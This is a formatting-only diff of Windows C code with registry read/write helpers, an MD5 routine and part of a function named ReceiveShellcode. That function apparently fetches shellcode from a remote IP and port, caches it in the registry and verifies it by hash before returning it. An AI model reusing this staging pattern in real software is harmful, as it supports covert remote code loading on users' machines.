@@ -91,16 +91,17 @@ int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
     return 0;
 }
 
-bool WriteRegistryString(const char* path, const char* keyName, const char* value) {
-	HKEY hKey;
-	LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
-	if (result != ERROR_SUCCESS) {
-		return false;
-	}
-	result = RegSetValueExA(hKey,keyName,0,REG_SZ,(const BYTE*)value,(DWORD)(strlen(value) + 1));
+bool WriteRegistryString(const char* path, const char* keyName, const char* value)
+{
+    HKEY hKey;
+    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+    if (result != ERROR_SUCCESS) {
+        return false;
+    }
+    result = RegSetValueExA(hKey,keyName,0,REG_SZ,(const BYTE*)value,(DWORD)(strlen(value) + 1));
 
-	RegCloseKey(hKey);
-	return result == ERROR_SUCCESS;
+    RegCloseKey(hKey);
+    return result == ERROR_SUCCESS;
 }
 
 char* ReadRegistryString(const char* subKey, const char* valueName)
@@ -126,88 +127,91 @@ char* ReadRegistryString(const char* subKey, const char* valueName)
     return data;
 }
 
-bool WriteAppSettingBinary(const char* path, const char* keyName, const void* data, DWORD dataSize) {
-	HKEY hKey;
-	LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
-	if (result != ERROR_SUCCESS) {
-		return false;
-	}
+bool WriteAppSettingBinary(const char* path, const char* keyName, const void* data, DWORD dataSize)
+{
+    HKEY hKey;
+    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+    if (result != ERROR_SUCCESS) {
+        return false;
+    }
     result = RegSetValueExA(hKey,keyName,0,REG_BINARY,(const BYTE*)data,dataSize);
 
-	RegCloseKey(hKey);
-	return result == ERROR_SUCCESS;
+    RegCloseKey(hKey);
+    return result == ERROR_SUCCESS;
 }
 
-bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBuf, DWORD* dataSize) {
-	HKEY hKey;
-	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,path,0,KEY_READ,&hKey);
-	if (result != ERROR_SUCCESS) {
-		*dataSize = 0;
-		return false;
-	}
+bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBuf, DWORD* dataSize)
+{
+    HKEY hKey;
+    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,path,0,KEY_READ,&hKey);
+    if (result != ERROR_SUCCESS) {
+        *dataSize = 0;
+        return false;
+    }
 
-	DWORD type = 0;
-	DWORD requiredSize = 0;
-	result = RegQueryValueExA(hKey,keyName,NULL,&type,NULL,&requiredSize);
-	if (result != ERROR_SUCCESS || type != REG_BINARY || requiredSize == 0 || requiredSize > *dataSize) {
-		*dataSize = 0;
-		RegCloseKey(hKey);
-		return false;
-	}
+    DWORD type = 0;
+    DWORD requiredSize = 0;
+    result = RegQueryValueExA(hKey,keyName,NULL,&type,NULL,&requiredSize);
+    if (result != ERROR_SUCCESS || type != REG_BINARY || requiredSize == 0 || requiredSize > *dataSize) {
+        *dataSize = 0;
+        RegCloseKey(hKey);
+        return false;
+    }
 
-	result = RegQueryValueExA(hKey,keyName,NULL,NULL,outDataBuf,&requiredSize);
-	RegCloseKey(hKey);
-	if (result == ERROR_SUCCESS) {
-		*dataSize = requiredSize;
-		return true;
-	}
+    result = RegQueryValueExA(hKey,keyName,NULL,NULL,outDataBuf,&requiredSize);
+    RegCloseKey(hKey);
+    if (result == ERROR_SUCCESS) {
+        *dataSize = requiredSize;
+        return true;
+    }
 
-	*dataSize = 0;
-	return false;
+    *dataSize = 0;
+    return false;
 }
 
 #define MD5_DIGEST_LENGTH 16
-const char* CalcMD5FromBytes(const BYTE* data, DWORD length) {
-	static char md5String[MD5_DIGEST_LENGTH * 2 + 1]; // 32 hex chars + '\0'
-	if (data == NULL || length == 0) {
-		memset(md5String, 0, sizeof(md5String));
-		return md5String;
-	}
-	HCRYPTPROV hProv = 0;
-	HCRYPTHASH hHash = 0;
-	BYTE hash[MD5_DIGEST_LENGTH];
-	DWORD hashLen = sizeof(hash);
+const char* CalcMD5FromBytes(const BYTE* data, DWORD length)
+{
+    static char md5String[MD5_DIGEST_LENGTH * 2 + 1]; // 32 hex chars + '\0'
+    if (data == NULL || length == 0) {
+        memset(md5String, 0, sizeof(md5String));
+        return md5String;
+    }
+    HCRYPTPROV hProv = 0;
+    HCRYPTHASH hHash = 0;
+    BYTE hash[MD5_DIGEST_LENGTH];
+    DWORD hashLen = sizeof(hash);
 
-	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-		return NULL;
-	}
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        return NULL;
+    }
 
-	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
-		CryptReleaseContext(hProv, 0);
-		return NULL;
-	}
+    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
+        CryptReleaseContext(hProv, 0);
+        return NULL;
+    }
 
-	if (!CryptHashData(hHash, data, length, 0)) {
-		CryptDestroyHash(hHash);
-		CryptReleaseContext(hProv, 0);
-		return NULL;
-	}
+    if (!CryptHashData(hHash, data, length, 0)) {
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        return NULL;
+    }
 
-	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
-		CryptDestroyHash(hHash);
-		CryptReleaseContext(hProv, 0);
-		return NULL;
-	}
+    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        return NULL;
+    }
 
-	// 转换为十六进制字符串
-	for (DWORD i = 0; i < hashLen; ++i) {
-		sprintf(&md5String[i * 2], "%02x", hash[i]);
-	}
-	md5String[MD5_DIGEST_LENGTH * 2] = '\0';
+    // 转换为十六进制字符串
+    for (DWORD i = 0; i < hashLen; ++i) {
+        sprintf(&md5String[i * 2], "%02x", hash[i]);
+    }
+    md5String[MD5_DIGEST_LENGTH * 2] = '\0';
 
-	CryptDestroyHash(hHash);
-	CryptReleaseContext(hProv, 0);
-	return md5String;
+    CryptDestroyHash(hHash);
+    CryptReleaseContext(hProv, 0);
+    return md5String;
 }
 
 const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
@@ -350,8 +354,8 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
         *sizeOut = binSize - 22;
         const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, *sizeOut);
         if (strcmp(md5, hash)==0) {
-			Mprintf("Read data from registry succeed: %d bytes\n", *sizeOut);
-			return buffer;
+            Mprintf("Read data from registry succeed: %d bytes\n", *sizeOut);
+            return buffer;
         }
     }
     // Registry data is incorrect
